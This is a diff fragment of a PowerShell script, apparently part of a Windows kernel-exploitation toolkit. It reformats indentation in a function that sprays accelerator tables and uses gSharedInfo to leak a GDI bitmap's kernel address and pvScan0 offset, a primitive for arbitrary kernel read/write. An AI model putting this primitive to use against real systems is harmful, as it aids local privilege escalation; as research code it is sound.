@@ -64,7 +64,7 @@ function Stage-gSharedInfoBitmap {
 
 	function Create-AcceleratorTable {
 	    [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
-		$AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) # +4 kb size
+	    $AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) # +4 kb size
 	    $User32Hanle = [gSharedInfoBitmap]::LoadLibrary("user32.dll")
 	    $gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, "gSharedInfo")
 	    if ($x32){
@@ -104,9 +104,9 @@ function Stage-gSharedInfoBitmap {
 	    if ($KernelArray.Length -gt 1) {
 	        if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
 	            Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
-				[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
-				$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # # +4 kb size -lt AcceleratorTable
-				break
+	            [IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
+	            $BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # # +4 kb size -lt AcceleratorTable
+	            break
 	        }
 	    }
 	    Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
@@ -114,9 +114,9 @@ function Stage-gSharedInfoBitmap {
 
 	$BitMapObject = @()
 	$HashTable = @{
-		BitmapHandle = $BitmapHandle
-		BitmapKernelObj = $($KernelArray[$i].KernelObj)
-		BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
+	    BitmapHandle = $BitmapHandle
+	    BitmapKernelObj = $($KernelArray[$i].KernelObj)
+	    BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
 	}
 	$Object = New-Object PSObject -Property $HashTable
 	$BitMapObject += $Object
